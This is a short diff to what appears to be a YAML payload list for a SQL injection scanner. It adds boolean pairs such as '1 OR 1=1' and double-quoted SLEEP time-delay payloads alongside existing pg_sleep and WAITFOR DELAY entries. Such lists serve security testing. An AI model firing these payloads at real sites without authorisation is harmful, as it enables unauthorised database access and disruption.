@@ -21,10 +21,14 @@ boolean_pairs:
     "false": "1 AND 1=2"
   - "true": "' OR '1'='1' -- "
     "false": "' OR '1'='2' -- "
+  - "true": "1 OR 1=1"
+    "false": "1 OR 1=0"
 
 time_based:
   - "' AND SLEEP({sleep})-- -"
   - "' OR SLEEP({sleep})-- -"
+  - "\" AND SLEEP({sleep})-- -"
+  - "\" OR SLEEP({sleep})-- -"
   - "1); SELECT pg_sleep({sleep});--"
   - "' AND pg_sleep({sleep})-- -"
   - "'; WAITFOR DELAY '0:0:{sleep}'--"
